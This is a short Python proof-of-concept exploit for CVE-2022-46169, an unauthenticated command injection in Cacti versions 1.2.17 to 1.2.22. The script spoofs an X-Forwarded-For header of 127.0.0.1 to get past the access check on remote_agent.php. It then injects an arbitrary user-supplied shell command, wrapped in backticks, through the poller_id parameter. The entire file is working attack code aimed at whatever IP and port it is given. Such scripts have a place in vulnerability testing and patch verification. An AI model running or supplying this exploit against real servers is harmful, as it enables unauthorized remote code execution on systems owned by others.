import requests
import sys

def print_help():
    print("Usage: python cacti-CI-poc.py [IP] ... [PORT] ... [COMMAND] ...\n")
    print("Example: python cacti-CI-poc.py \"127.0.0.1\" \"8080\" \"touch /tmp/test.txt\" \n")
    print("This is a simple PoC for CVE-2022-46169 a.k.a Cacti Unauthenticated Command Injection, a vulnerability allows an unauthenticated user to execute arbitrary code on a server running Cacti prior from version 1.2.17 to 1.2.22, if a specific data source was selected for any monitored device")

def send_http_get(ip, port, poller_id):
    url = f"http://{ip}:{port}/remote_agent.php?action=polldata&local_data_ids[0]=6&host_id=1&poller_id=`{poller_id}`"
    headers = {
        'X-Forwarded-For': '127.0.0.1',
        'Host': 'localhost.lan',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1'
    }

    response = requests.get(url, headers=headers)
    print(response.text)

if __name__ == "__main__":
    if len(sys.argv) == 2 and sys.argv[1] == "-h":
        print_help()
    elif len(sys.argv) < 4:
        print("Debe proporcionar el valor de los parámetros 'IP', 'PORT' y 'COMMAND'.")
    else:
        ip = sys.argv[1]
        port = sys.argv[2]
        poller_id = sys.argv[3]
        send_http_get(ip, port, poller_id)
